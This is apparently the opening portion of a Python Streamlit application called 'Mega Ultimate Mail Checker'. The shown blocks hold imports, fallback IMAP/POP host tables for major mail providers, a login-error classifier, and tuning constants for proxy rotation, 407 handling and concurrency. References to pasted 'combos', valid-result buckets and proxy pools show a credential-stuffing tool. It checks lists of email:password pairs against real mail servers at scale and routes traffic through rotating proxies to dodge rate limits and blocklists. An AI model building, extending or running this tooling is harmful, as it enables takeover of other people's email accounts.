# @@FILE app.py blocks=111 version=v13.47
# @@BLOCK 000 FILE_HEADER deps=-
"""
Mega Ultimate Mail Checker - v13.47  (BLOCK EDITION)
====================================================
Full version history lives in CHANGELOG.md.

HOW THIS FILE IS ORGANISED
--------------------------
Every section is a NAMED, NUMBERED, REPLACEABLE BLOCK:

    # @@BLOCK 016 PROXY_407_CONTRACT deps=-
    ...
    # @@END 016 PROXY_407_CONTRACT

* To change behaviour, REPLACE A WHOLE BLOCK - never edit inside one.
* The @@BLOCK / @@END lines are part of the contract. Keep the id and the
  NAME byte-for-byte, and keep the block ids ascending.
* `python verify_blocks.py` proves the frame: ids contiguous, every block
  closed, deps earlier, nothing between blocks, no non-ASCII outside a
  comment or a string, and the file still compiles.
* `deps=` lists what a block reads from. If you change the names a block
  PUBLISHES, every dependent block must be re-issued too.
* Blocks 000..110 in ascending order ARE the execution order.

FIX LEDGER (every entry names the block it lands in)
----------------------------------------------------
P0-1  a WRONG verdict returned on rung 1 on any domain with a single local
      host: the confirmation pool counted only LOCAL hosts and the current
      host was already in tried_hosts.                     [101]
P0-2  allow_direct was latched BEFORE the proxy phase, so in Proxy Mode =
      aggressive with Retry CF off a 407-flooded proxy phase could never
      fall through to DIRECT.                              [103]
P0-3  status.py tested the greedy _APP_PASSWORD tokens (oauth / tenant /
      consent / mfa / 2fa) BEFORE _WRONG_STRONG, and _RETRY owned
      backend / upstream / downstream / unavailable.       [status.py 006, 007]
P0-4  the duplicate WRONG block after the first return in
      _handle_app_or_wrong was unreachable dead code and broke
      verify_v1337.py.                                     [101]
P1-1  only valid_results was rehydrated from disk, so a session reset wiped
      every other bucket and every log.                    [037]
P1-2  the combos text_area and the file uploader had no key=, so a paste
      could vanish on a rerun.                             [037]
P1-3  build_diagnostics_text() ran on EVERY rerun inside a collapsed
      expander.                                            [081]
P1-4  the per-account report dataframe was rebuilt every 0.12s. [106]
P2-1  PROXY_407_FORCE_DIRECT 3 -> 2, and the same-node 407 retry now needs
      real window left instead of 3s.                      [016, 102]
P2-2  [data-testid="stHeader"]{height:2.1rem} fought Streamlit's own header;
      [data-testid="stSidebar"] * clobbered sidebar icons. [032]
P2-3  the 13-metric rows collided on a phone.              [035]

NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
proxies.txt / Streamlit secrets / live DNS / live ip-api.
"""
# @@END 000 FILE_HEADER

# @@BLOCK 001 IMPORTS deps=-
import base64
import glob
import html
import imaplib
import json
import os
import platform
import poplib
import random
import re
import socket
import ssl
import sys
import threading
import time
import warnings
import zipfile
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import List
from urllib.parse import urlparse

import pandas as pd
import streamlit as str_lit
# @@END 001 IMPORTS

# @@BLOCK 002 HOSTS_IMPORT_FALLBACK deps=-
HOSTS_OK = True
HOSTS_HAS_RANKING = True
HOSTS_IMPORT_NOTE = ""

try:
    from hosts import (conf as host_conf, STRICT_APP, ZERO_ACCESS, PARENT,
                       MS_DOMAINS, GMAIL_DOMAINS,
                       smtp_candidates as host_smtp_candidates)
except Exception as _hosts_core_err:
    HOSTS_OK = False
    HOSTS_IMPORT_NOTE = (f"hosts.py core import failed ({_hosts_core_err}); "
                         f"using built-in tables.")
    STRICT_APP = {"gmail.com", "googlemail.com", "outlook.com", "hotmail.com",
                  "live.com", "windowslive.com"}
    ZERO_ACCESS = {"proton.me", "protonmail.com", "pm.me", "tuta.io",
                   "tutanota.com", "tutamail.com", "tuta.com"}
    PARENT = {"memoad.jp": "biglobe.ne.jp"}
    MS_DOMAINS = {"outlook.com", "hotmail.com", "live.com", "msn.com", "hotmail.co.uk"}
    GMAIL_DOMAINS = {"gmail.com", "googlemail.com"}

    def host_smtp_candidates(domain):
        return []

    _BB_STATIC_CONF = {
        "gmail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "googlemail.com": (["imap.gmail.com"], ["pop.gmail.com"]),
        "outlook.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "hotmail.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "live.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "msn.com": (["outlook.office365.com"], ["outlook.office365.com"]),
        "yahoo.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "ymail.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btinternet.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "bt.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "btopenworld.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "talk21.com": (["imap.mail.yahoo.com"], ["pop.mail.yahoo.com"]),
        "sky.com": (["imap.tools.sky.com"], ["imap.tools.sky.com"]),
        "virginmedia.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "ntlworld.com": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "blueyonder.co.uk": (["imap.virginmedia.com"], ["imap.virginmedia.com"]),
        "aol.com": (["imap.aol.com"], ["pop.aol.com"]),
        "icloud.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "me.com": (["imap.mail.me.com"], ["pop.mail.me.com"]),
        "zoho.com": (["imap.zoho.com"], ["pop.zoho.com"]),
        "gmx.net": (["imap.gmx.net"], ["pop.gmx.net"]),
        "gmx.de": (["imap.gmx.net"], ["pop.gmx.net"]),
        "web.de": (["imap.web.de"], ["pop3.web.de"]),
        "t-online.de": (["secureimap.t-online.de"], ["securepop.t-online.de"]),
        "freenet.de": (["imap.freenet.de"], ["pop.freenet.de"]),
        "free.fr": (["imap.free.fr"], ["pop.free.fr"]),
        "orange.fr": (["imap.orange.fr"], ["pop.orange.fr"]),
        "qq.com": (["imap.qq.com"], ["pop.qq.com"]),
        "naver.com": (["imap.naver.com"], ["pop.naver.com"]),
    }

    def host_conf(domain):
        domain = (domain or "").lower().strip()
        if domain in ZERO_ACCESS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
        got = _BB_STATIC_CONF.get(domain)
        if got:
            return {"imap": list(got[0]), "pop": list(got[1]), "pop3": list(got[1])}
        return None
# @@END 002 HOSTS_IMPORT_FALLBACK

# @@BLOCK 003 HOSTS_RANK_FALLBACK deps=-
try:
    from hosts import rank_hosts as host_rank_hosts, is_junk_host as host_is_junk
except Exception as _hosts_rank_err:
    HOSTS_HAS_RANKING = False
    _note = (f"hosts.py has no rank_hosts/is_junk_host ({_hosts_rank_err}); "
             f"using built-in ranking.")
    HOSTS_IMPORT_NOTE = (HOSTS_IMPORT_NOTE + " " + _note).strip() if HOSTS_IMPORT_NOTE else _note

    _BB_ROUTER_LABEL_EXACT = re.compile(
        r"^(?:"
        r"mx|mx\d+|mta|mtas|mta\d+|smtp|smtps|smtpout|smtp-in|smtp-out|"
        r"inbound|outbound|relay|relay\d+|spool|filter|filters|cluster|clust\d+|"
        r"edge|edge\d+|gateway|gw|gw\d+|router|mailrouter|aspmx|aspmx\d*|"
        r"alt\d+|protection|hs|lb|"
        r"mx-aol|mx-aol\.mail|mx\.google|eur\.olc|olc\.protection"
        r")$"
    )
    _BB_ROUTER_TOKENS = (
        "mta", "smtp", "relay", "inbound", "outbound", "spool",
        "filter", "cluster", "mailrouter", "olc.protection",
        "protection.outlook", "aspmx", "gateway",
    )
    _BB_SERVICE_PREFIXES = (
        "imap", "imaps", "imap2", "mail", "mail2", "pop", "pop3", "pop3s",
        "webmail", "webmail2", "email", "correo", "zimbra", "zcs",
        "secure", "ssl", "outlook", "exchange", "owa",
    )
    _BB_SKIP_LABELS = {"mail", "email", "webmail", "imap", "imaps", "pop",
                       "pop3", "smtp", "correo"}

    def host_is_junk(host, domain=None):
        h = (host or "").lower().strip().strip(".")
        if not h:
            return True
        if domain and h == (domain or "").lower().strip():
            return True
        labels = h.split(".")
        if len(labels) < 2:
            return False
        for lab in labels[:-1]:
            if _BB_ROUTER_LABEL_EXACT.match(lab):
                return True
        for lab in labels[:-1]:
            if lab in _BB_SKIP_LABELS:
                continue
            if any(tok in lab for tok in _BB_ROUTER_TOKENS):
                return True
            if re.search(r"(?:^|[-_])mx\d*(?:$|[-_])", lab):
                return True
        return False

    def _bb_tier(host, domain):
        h = (host or "").lower().strip().strip(".")
        d = (domain or "").lower().strip().strip(".")
        if not h:
            return 4
        if d and h == d:
            return 3
        if d and h.endswith("." + d):
            if host_is_junk(h, d):
                return 3
            if h[: -(len(d) + 1)].split(".")[0] in _BB_SERVICE_PREFIXES:
                return 0
            return 1
        if host_is_junk(h, d):
            return 3
        return 2

    def _bb_resolves(host):
        try:
            socket.getaddrinfo(host, None)
            return True
        except Exception:
            return False

    _bb_probe_lock = threading.Lock()
    _bb_probe_cache = {}
    _BB_PROBE_TTL = 600

    def _bb_port_open(host, port, timeout=1.5):
        try:
            _s = socket.create_connection((host, port), timeout=timeout)
            _s.close()
            return True
        except Exception:
            return False

    def _bb_probe(host):
        if not host:
            return False
        now = time.time()
        with _bb_probe_lock:
            hit = _bb_probe_cache.get(host)
            if hit and now - hit[0] < _BB_PROBE_TTL:
                return hit[1]
        ok = _bb_port_open(host, 993) or _bb_port_open(host, 143)
        with _bb_probe_lock:
            _bb_probe_cache[host] = (now, ok)
        return ok

    def host_rank_hosts(hosts, domain, probe=True):
        hosts = [h for h in (hosts or []) if h]
        if not hosts:
            return []
        indexed = list(enumerate(hosts))
        if not probe:
            indexed.sort(key=lambda t: (0 if _bb_resolves(t[1]) else 1,
                                        _bb_tier(t[1], domain), t[0]))
            return [h for _i, h in indexed]
        tiers = {h: _bb_tier(h, domain) for h in set(hosts)}
        resolves = {h: _bb_resolves(h) for h in set(hosts)}
        to_probe = [h for h in dict.fromkeys(hosts) if tiers[h] <= 1 and resolves[h]][:6]
        live = {}
        if to_probe:
            try:
                with ThreadPoolExecutor(max_workers=min(6, len(to_probe))) as ex:
                    futs = {ex.submit(_bb_probe, h): h for h in to_probe}
                    for fut in as_completed(futs, timeout=6):
                        h = futs[fut]
                        try:
                            live[h] = fut.result()
                        except Exception:
                            live[h] = False
            except Exception:
                pass
        indexed.sort(key=lambda t: (
            0 if resolves.get(t[1], False) else 1,
            tiers.get(t[1], 4),
            0 if live.get(t[1], False) else 1,
            t[0],
        ))
        return [h for _i, h in indexed]

# --- v13.25: delegate host merging to hosts.py so FAMILY_PRIORITY applies ---
try:
    from hosts import (merge_domain_guesses as _hosts_merge_guesses,
                       _family_priority as _hosts_family_priority)
    _HAVE_HOSTS_MERGE = True
except Exception:
    _HAVE_HOSTS_MERGE = False
# @@END 003 HOSTS_RANK_FALLBACK

# @@BLOCK 004 STATUS_IMPORT_FALLBACK deps=-
try:
    from status import (
        VALID, WRONG, WRONG_PASSWORD, APP, NEED_APP_PASSWORD,
        FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
        SKIP, SKIPPED_COOLDOWN, UNKNOWN,
        RETRY, RETRY_LATER, RBL, RBL_BLOCKED, SMTP_FAILED, DNS_FAILED,
        LOGIN_DROPPED,
        classify_error as st_classify, is_proxy_level_error as st_proxy_level,
        display as st_display, color as st_color,
    )
    STATUS_OK = True
    STATUS_IMPORT_NOTE = "status.py loaded (real classifier active)."
except Exception as _status_err:
    STATUS_OK = False
    STATUS_IMPORT_NOTE = f"status.py import failed ({_status_err}); using inline fallback."
    warnings.warn(STATUS_IMPORT_NOTE)
    VALID = "valid"
    WRONG = WRONG_PASSWORD = "wrong_password"
    APP = NEED_APP_PASSWORD = "need_app_password"
    FAILED = CONNECTION_FAILED = "connection_failed"
    PROXY_UNHEALTHY = "proxy_unhealthy"
    SKIP = SKIPPED_COOLDOWN = "skipped_cooldown"
    UNKNOWN = "unknown"
    RETRY = RETRY_LATER = "retry_later"
    RBL = RBL_BLOCKED = "rbl_blocked"
    SMTP_FAILED = "smtp_failed"
    DNS_FAILED = "dns_failed"
    LOGIN_DROPPED = "login_dropped"
    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, LOGIN_DROPPED, RETRY_LATER,
              RBL_BLOCKED, SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED,
              PROXY_UNHEALTHY, UNKNOWN, SKIPPED_COOLDOWN]
    ST_LABELS = {s: s.upper() for s in ST_ALL}
    ST_COLORS = {
        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", LOGIN_DROPPED: "#f43f5e",
        CONNECTION_FAILED: "#eab308", PROXY_UNHEALTHY: "#e879f9",
        NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", RBL_BLOCKED: "#facc15",
        SMTP_FAILED: "#a855f7", DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8",
        SKIPPED_COOLDOWN: "#a78bfa",
    }
    ST_PRIORITY = {
        VALID: 0, NEED_APP_PASSWORD: 1, WRONG_PASSWORD: 2, RBL_BLOCKED: 3,
        LOGIN_DROPPED: 4, RETRY_LATER: 5, SMTP_FAILED: 6, DNS_FAILED: 7,
        CONNECTION_FAILED: 8, PROXY_UNHEALTHY: 9, UNKNOWN: 10, SKIPPED_COOLDOWN: 11,
    }

    # FIX P0-3: order mirrors status.py - WRONG_STRONG before the greedy APP
    # tokens, and _RETRY no longer owns backend/upstream/downstream.
    _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
                        "authentication failed", "invalid credentials",
                        "invalid user name or password", "login incorrect",
                        "wrong password", "authenticate error",
                        "invalid login or password")
    _FB_APP = ("app password", "application specific password",
               "application-specific password", "app-specific password",
               "basic authentication is disabled", "basic auth is disabled",
               "basicauthenticationdisabled", "web login required",
               "via your web browser", "less secure app", "lesssecureapp",
               "oauth", "oauth2", "token required", "an app password is required",
               "use an app password", "enable imap", "imap access is disabled",
               "imap is disabled", "pop access is disabled", "enable pop",
               "2fa", "2-step", "2 step", "mfa", "multi-factor", "multi factor",
               "two-factor", "two factor", "modern authentication",
               "sign in with", "log in with your browser", "consent", "tenant",
               "aadsts50076", "aadsts50079", "aadsts50074", "strongauth")
    _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
               "blacklist", "blacklisted", "ip blocked")
    _FB_DNS = ("does not resolve", "failed to resolve", "name or service not known",
               "nodename nor servname", "getaddrinfo", "gaierror",
               "no address associated", "temporary failure in name resolution",
               "nxdomain", "servfail")
    _FB_RETRY_HARD = ("too many", "limit", "quota", "busy", "throttle",
                      "rate limit", "try again", "temporarily unavailable")
    _FB_SERVER_DROP = ("terminating connection", "imap server terminating",
                       "server terminating", "* bye", " bye ", "bye ",
                       "auth process broken", "connection is closed",
                       "server closed the connection", "server dropped the connection")
    _FB_CONN_STRONG = ("connection reset by peer", "connection reset", "reset by peer",
                       "connection refused", "connection aborted", "connection closed",
                       "connection dropped", "connection lost", "connection failure",
                       "broken pipe", "unexpected eof", "eof occurred", "socket error",
                       "socket closed", "socket timeout", "bad file descriptor",
                       "network is unreachable", "no route to host", "host is down",
                       "timed out", "timeout", "timedout", "ssl", "tls",
                       "wrong version number", "handshake", "certificate",
                       "cert verify", "cannot connect", "unable to connect",
                       "failed to connect", "connect failed", "negotiation failure",
                       "not supported by server", "stls not supported",
                       "starttls not supported", "tls not supported", "imap4rev1")
    _FB_RETRY = ("lookup failed", "user could not be routed", "could not route",
                 "retry", "try again", "temporarily unavailable", "temporary failure",
                 "service unavailable", "server busy", "too many", "rate limit",
                 "ratelimit", "throttle", "throttled", "over quota", "quota exceeded",
                 "mailbox full", "system busy", "try later", "unavailable",
                 "authentication services unavailable", "greylist", "greylisted",
                 "unexpected extra arguments")
    _FB_CONN = ("407", "proxy authentication", "proxy auth", "proxyconnect",
                "proxy connect", "proxy route", "bad proxy format", "proxy", "socks")
    _FB_WRONG = ("authenticate failed", "authentication error", "auth failed",
                 "auth failure", "invalid credential", "invalid login",
                 "invalid password", "invalid user", "invalid username",
                 "invalid user name", "invalid account", "login failed",
                 "login failure", "login returned non-ok", "login non-ok",
                 "login error", "password incorrect", "password invalid",
                 "incorrect password", "realmless", "auth error", "[auth]",
                 "authentication", "not authenticated", "bad credentials",
                 "bad username", "bad password", "logon failure",
                 "username and password not accepted", "user rejected",
                 "password rejected", "invalid token", "expired token",
                 "internal server error", "535")
    _FB_BARE = ("login", "logon", "auth", "authenticate", "authentication",
                "sign in", "signin", "sign-in", "credentials", "invalid")

    def st_classify(raw, domain=""):
        t = (raw or "").strip().lower()
        if not t:
            return UNKNOWN
        if t.strip().rstrip(".:!,;").strip() in _FB_BARE:
            return WRONG_PASSWORD
        for table, val in ((_FB_WRONG_STRONG, WRONG_PASSWORD),
                           (_FB_APP, NEED_APP_PASSWORD),
                           (_FB_RBL, RBL_BLOCKED),
                           (_FB_DNS, DNS_FAILED),
                           (_FB_RETRY_HARD, RETRY_LATER),
                           (_FB_SERVER_DROP, LOGIN_DROPPED),
                           (_FB_CONN_STRONG, CONNECTION_FAILED),
                           (_FB_RETRY, RETRY_LATER),
                           (_FB_CONN, CONNECTION_FAILED),
                           (_FB_WRONG, WRONG_PASSWORD)):
            if any(n in t for n in table):
                return val
        return UNKNOWN

    def st_proxy_level(raw):
        s = (raw or "").lower()
        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))

    def st_display(s):
        return ST_LABELS.get(s, s)

    def st_color(s):
        return ST_COLORS.get(s, "#cbd5e1")
# @@END 004 STATUS_IMPORT_FALLBACK

# @@BLOCK 005 MSOAUTH_IMPORT deps=-
try:
    import ms_oauth
    MS_OAUTH_OK = True
except Exception:
    ms_oauth = None
    MS_OAUTH_OK = False

if not MS_OAUTH_OK:
    warnings.warn("ms_oauth.py unavailable; Microsoft accounts will report "
                  "NEED_APP_PASSWORD and never validate without an app password.")
# @@END 005 MSOAUTH_IMPORT

# @@BLOCK 006 OPTIONAL_LIBS deps=-
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

if not SOCKS_OK:
    warnings.warn("PySocks is not installed! SOCKS proxy support disabled. "
                  "Run 'pip install PySocks'.")

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
# @@END 006 OPTIONAL_LIBS

# @@BLOCK 007 PAGE_CONFIG deps=-
# MUST be the first Streamlit call in the process.
str_lit.set_page_config(
    page_title="Mega Ultimate Mail Checker",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="collapsed",
)

import importlib

import auth
import runstate

# A Streamlit rerun re-uses the SAME process, so a module imported before a
# redeploy stays in sys.modules and keeps answering with the OLD shape.  BOTH
# modules need the guard - it was applied to auth and not to runstate, which is
# why runstate.tick() answered AttributeError after a redeploy.  Both guards are
# hasattr(): a bare `auth.fit_panel` expression is picked up by Streamlit's
# magic-write, which routes it through st.help -> ast.parse and can raise
# IndentationError on the enclosing `try:` - and it also dumps a help panel into
# the page above the hero.
if not hasattr(auth, "fit_panel"):
    auth = importlib.reload(auth)
if not hasattr(runstate, "interrupt"):
    runstate = importlib.reload(runstate)

# The passkey gate lives in auth.py so every page shares ONE implementation.
# user_file() is re-exported: default_cfg(), RESULTS_DIR, CLEAN_VALID_FILE and
# every results glob prefix per-user names with the unlocked hash.
user_file = auth.user_file

# require() first, fit() second - the order every page uses. require() stops the
# script while locked, so fit() only runs once the gate has passed.
auth.require(str_lit)
auth.fit(str_lit)

# ---- teardown watchdog, and it MUST be after require() ---------------------
# runstate._dir() resolves through auth.user_file(), which is a throwaway
# anon<hex> prefix until the passphrase is unlocked. Called before require() it
# read - and CREATED - anon<hex>_mail_results/ while begin(), progress() and
# finish() all wrote to <hash>_mail_results/, so it could never see the record it
# exists to watch.
#
# run_active is PROCESS state and a rerun tears the script down without running
# the loop's finally, so it is still True on the load after a teardown while the
# loop that owned it is gone. That is the proof, and it is immediate - the old
# path waited 60s for a stale heartbeat and then blamed the watchdog.
#
# STATE is built in block 024, which has NOT run yet at this point, and Streamlit
# hands every rerun a FRESH module namespace - so globals().get("STATE") was
# always None and every isinstance(_st_run, dict) branch below was dead. The flag
# is carried in session_state instead, which survives a rerun.
# cause() is read first so a reason already stamped (the Stop button) is
# preserved instead of being overwritten by the generic text.
_run_was_active = bool(str_lit.session_state.get("run_active"))
if _run_was_active:
    runstate.interrupt(
        runstate.cause()
        or "UI interaction / rerun - the run loop was torn down")
    str_lit.session_state["run_active"] = False

# Last-resort sweep for a record with no run_active behind it (a redeploy or a
# full process restart), and it still respects the 60s staleness window.
_rs_path = runstate.tick()
# @@END 007 PAGE_CONFIG

# @@BLOCK 008 BUILD_IDENTITY deps=-
# Bump CFG_VERSION whenever a DEFAULT changes in a way users should inherit.
CFG_VERSION = 1347
BUILD_TAG = "v13.47"
# @@END 008 BUILD_IDENTITY

# @@BLOCK 009 TIMING_CONSTANTS deps=-
DOMAIN_CACHE_TTL = 86400
PROBE_TIMEOUT_DEFAULT = 8.0
PROXY_PRECHECK_TIMEOUT_DEFAULT = 5
CONNECT_FLOOR_DEFAULT = 10.0
READ_FLOOR_DEFAULT = 15.0
CONNECT_FLOOR_MIN = 10.0
READ_FLOOR_MIN = 15.0
ATTEMPT_TIMEOUT_NORMAL = 15
ATTEMPT_TIMEOUT_FAST = 10
ATTEMPT_TIMEOUT_DEEP = 20
DEADLINE_NORMAL = 150.0
DEADLINE_FAST = 60.0
DEADLINE_DEEP = 240.0
WORKERS_NORMAL = 12
WORKERS_FAST = 30
WORKERS_DEEP = 8
RUNG_COST_MIN = 8.0
RUNG_COST_MAX = 12.0
WORK_FLOOR_FACTOR = 1.5
WORK_FLOOR_PAD = 15.0
ROTATE_SETTLE = 0.4
SLOW_RETRY_BACKOFF = 1.2
SAME_HOST_RETRIES_DEFAULT = 1
FAILURE_COOLDOWN_DEFAULT = 45.0
WORKER_FUTURE_PAD = 60
GEO_CACHE_TTL = 600
PROBE_RESULT_TTL = 120
LEGACY_RUNG_TIMEOUT = 8.0
LEGACY_PORTS = (143, 110)
GEO_FAIL_TTL = 300.0
GEO_MIN_INTERVAL = 60.0 / 45.0
# @@END 009 TIMING_CONSTANTS

# @@BLOCK 010 PHASE_FRACTIONS deps=-
# Split of the per-account budget between the proxy phase and the direct phase.
PROXY_PRIMARY_FRAC = 0.40
PROXY_TOTAL_FRAC = 0.58
DIRECT_PRIMARY_FRAC = 0.72
DIRECT_FIRST_DIRECT_PRIMARY_FRAC = 0.35
DIRECT_FIRST_DIRECT_TOTAL_FRAC = 0.55
DIRECT_FIRST_PROXY_START_FRAC = 0.58
# @@END 010 PHASE_FRACTIONS

# @@BLOCK 011 PROTOCOL_CONSTANTS deps=-
PROTOCOL_IMAP = "IMAP"
PROTOCOL_POP = "POP3"
PROTOCOL_SMTP = "SMTP"
PROTOCOL_SIEVE = "ManageSieve"
PROTOCOL_OPTIONS = [PROTOCOL_IMAP, PROTOCOL_POP, PROTOCOL_SMTP, PROTOCOL_SIEVE]
PROTOCOL_SELECTION_DEFAULT = [PROTOCOL_IMAP, PROTOCOL_POP]

RUNG_IMAP = "IMAP"
RUNG_POP = "POP"
RUNG_SMTP = "SMTP"
RUNG_SIEVE = "SIEVE"

SMTP_RUNG_PORTS = ((587, "starttls"), (465, "ssl"), (25, "plain"))
SIEVE_PORT = 4190
SMTP_HOST_CAP = 1
# @@END 011 PROTOCOL_CONSTANTS

# @@BLOCK 012 CONCURRENCY_CONSTANTS deps=-
PROXY_CONCURRENCY_DEFAULT = 4
HOST_CONCURRENCY_DEFAULT = 2
PROXY_IP_CONCURRENCY_DEFAULT = 1
PROXY_SUBUSER_CONCURRENCY_DEFAULT = 1
PROBE_WORKERS_DEFAULT = 3
PROBE_WORKERS_BUSY = 2
PROBE_WORKERS_BULK = 6


def _gate_wait(attempt_to: float) -> float:
    """How long a gate will wait before giving up and barging through."""
    try:
        return max(6.0, float(attempt_to) * 1.5)
    except Exception:
        return 6.0
# @@END 012 CONCURRENCY_CONSTANTS

# @@BLOCK 013 FRUGALITY_CONSTANTS deps=-
PROBER_IDLE_SLEEP = 300.0
PROBER_BUSY_SLEEP = 10.0
PROBER_STALE_WHILE_RUNNING = 300.0
PROBER_IDLE_ENABLED_DEFAULT = False
PROBE_SECOND_SCHEME_DEFAULT = False
PROBE_MAX_TARGETS_DEFAULT = 1
# @@END 013 FRUGALITY_CONSTANTS

# @@BLOCK 014 UI_RENDER_CONSTANTS deps=-
PROBE_BATCH_BUDGET = 120.0
PROBE_BUDGET_START = 120.0
UI_MIN_INTERVAL = 0.12
BUCKET_RENDER_TAIL = 40
LOG_CAP_DEBUG = 200
LOG_CAP_QUIET = 120
REPORT_ENTRIES_MAX = 2000
# FIX P1-3 / P1-4: the two per-rerun and per-account hogs get their own clocks.
DIAG_CACHE_TTL = 30.0
REPORT_DF_MIN_INTERVAL = 1.0
# Checkpoint clock. The 100-account counter alone meant a 47-account run never
# reached a checkpoint before a teardown: the record stayed at 0/N, the heartbeat
# went stale and unfinished_live.json was never written, so Resume was empty and
# the stop had no reason. 5s keeps counts, remaining and the reason real.
CHECKPOINT_SECONDS = 5.0
# Consecutive transport-ish verdicts before the connection is called down.
NET_STREAK_TRIP = 8
# @@END 014 UI_RENDER_CONSTANTS

# @@BLOCK 015 MAIL_SPOT_CONSTANTS deps=-
MAIL_SPOT_CHECK_DEFAULT = True
MAIL_SPOT_NODES = 3
MAIL_SPOT_TIMEOUT = 6.0
MAIL_SPOT_FALLBACK = ("imap.gmail.com", 993)
# @@END 015 MAIL_SPOT_CONSTANTS

# @@BLOCK 016 PROXY_407_CONTRACT deps=-
# FIX P2-1: every 407ing proxy attempt is a request that cannot succeed, and a
# same-node retry costs a whole attempt.  3 strikes per rung let a single rung
# spend ~4 x 28s before the storm breaker armed.  2 is the working number.
PROXY_407_QUARANTINE = 3
PROXY_407_FORCE_DIRECT = 2
PROXY_407_BACKOFF = 0.8
PROXY_407_COOLDOWN = 90.0
# A same-node 407 retry only makes sense if a REAL attempt still fits.
PROXY_407_RETRY_WINDOW_FACTOR = 1.6
# @@END 016 PROXY_407_CONTRACT

# @@BLOCK 017 POOL_FILTER_CONSTANTS deps=-
MAX_ROTATIONS_DEFAULT = 2
CHECK_PASS2_DEFAULT = False
DEDUPE_PROXIES_DEFAULT = True
PROBE_STRICT_DEFAULT = True
MIN_PROXY_SCORE_DEFAULT = 10
BLACKLIST_CF_DEFAULT = 15
CIRCUIT_BREAKER_SECONDS = 30.0
# @@END 017 POOL_FILTER_CONSTANTS

# @@BLOCK 018 PROBE_TARGET_TABLES deps=-
PROBE_TARGET_AUTO = "auto (from combo list)"
PROBE_TARGET_DEFAULT = "443 (HTTPS)"
PROBE_TARGET_OPTIONS = [
    PROBE_TARGET_AUTO,
    "993 (IMAP)",
    "443 (HTTPS)",
    "windstream 993",
    "windstream 995",
    "both (either)",
]
PROBE_TARGET_PORTS = {
    PROBE_TARGET_AUTO: [("imap.gmail.com", 993, "auto")],
    "993 (IMAP)": [("imap.gmail.com", 993, "993")],
    "443 (HTTPS)": [("api.ipify.org", 443, "443")],
    "windstream 993": [("imap.windstream.net", 993, "ws-imap993")],
    "windstream 995": [("pop.windstream.net", 995, "ws-pop995")],
    "both (either)": [("imap.gmail.com", 993, "993"), ("api.ipify.org", 443, "443")],
}
# @@END 018 PROBE_TARGET_TABLES

# @@BLOCK 019 SETTING_DEFAULTS deps=-
SETTING_DEFAULTS = {
    # v13.42: the Display Fit pair. Without these, ♻️ Reset Defaults left the
    # font size and content scale at whatever the user last dragged, and they
    # were the only sidebar widgets with no reset target.
    "ui_font_size": 16,
    "ui_content_scale": 100,
    "ui_mode": "Normal Mode",
    "ui_protocols": list(PROTOCOL_SELECTION_DEFAULT),
    "ui_workers": WORKERS_NORMAL,
    "ui_deadline": int(DEADLINE_NORMAL),
    "ui_timeout": ATTEMPT_TIMEOUT_NORMAL,
    "ui_max_acc": 5000,
    "ui_blacklist_cf": BLACKLIST_CF_DEFAULT,
    "ui_dynamic_scaling": True,
    "ui_max_hosts": 3,
    "ui_alt_user": True,
    "ui_confirm_wrong": True,
    "ui_smtp_precheck": False,
    "ui_min_proxy_score": MIN_PROXY_SCORE_DEFAULT,
    "ui_probe_precheck_timeout": PROXY_PRECHECK_TIMEOUT_DEFAULT,
    "ui_probe_timeout": int(PROBE_TIMEOUT_DEFAULT),
    "ui_probe_target": PROBE_TARGET_DEFAULT,
    "ui_probe_strict": PROBE_STRICT_DEFAULT,
    "ui_probe_maxtargets": PROBE_MAX_TARGETS_DEFAULT,
    "ui_probe_scheme2": PROBE_SECOND_SCHEME_DEFAULT,
    "ui_prober_idle": PROBER_IDLE_ENABLED_DEFAULT,
    "ui_probe_sample": 0,
    "ui_mail_spot": MAIL_SPOT_CHECK_DEFAULT,
    "ui_dedupe": DEDUPE_PROXIES_DEFAULT,
    "ui_allow_blacklist": False,
    "ui_quarantine": True,
    "ui_host_conc": HOST_CONCURRENCY_DEFAULT,
    "ui_ip_conc": PROXY_IP_CONCURRENCY_DEFAULT,
    "ui_subuser_conc": PROXY_SUBUSER_CONCURRENCY_DEFAULT,
    "ui_proxy_conc": PROXY_CONCURRENCY_DEFAULT,
    "ui_direct_first": False,
    "ui_same_host_retries": SAME_HOST_RETRIES_DEFAULT,
    "ui_max_rot": MAX_ROTATIONS_DEFAULT,
    "ui_pass2": CHECK_PASS2_DEFAULT,
    "ui_random_rot": True,
    "ui_geo_call": False,
    "ui_conn_hint": "Auto",
    "ui_starttls": True,
    "ui_proxy_mode": "fallback",
    "chk_use_proxy": True,
    "chk_retry_cf": True,
    "chk_self_signed": True,
    "chk_proxy_test_flight": True,
    "chk_skip_app": False,
    "chk_debug_mode": True,
}
